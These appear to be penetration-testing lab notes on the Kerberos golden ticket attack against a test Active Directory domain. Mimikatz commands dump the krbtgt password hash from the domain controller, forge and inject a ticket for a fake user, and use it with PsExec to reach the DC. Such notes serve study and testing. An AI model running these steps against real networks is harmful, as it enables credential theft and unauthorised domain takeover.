GOLDEN TICKETS
--------------
-KDC encrypts TGT with its secret key. This secret key is password hash of a domain user account called krbtgt.
-If we can obtain krbtgt password hash, we can create self-made TGT, also known as golden tickets.

Test
Move laterally from Win10 to DC via PsExec as a regular user.
> psexec.exe \\dc.hacker.testlab cmd.exe
Access Denied

Go to DC as admin user and cd to C:
mimikatz# privilege::debug
mimikatz# lsadump::lsa /patch

// delete existing tickets
mimikatz# kerberos::purge
// obtain SID
> whoami /user
mimikatz# kerberos::golden /user:fakeuser /domain:hacker.testlab /sid:<> /krbtgt:<> /ptt

Once golden ticket is injected into memory
mimikatz# misc::cmd
> psexec.exe \\dc.hacker cmd.exe
> whoami 
fake user
> whoami /groups
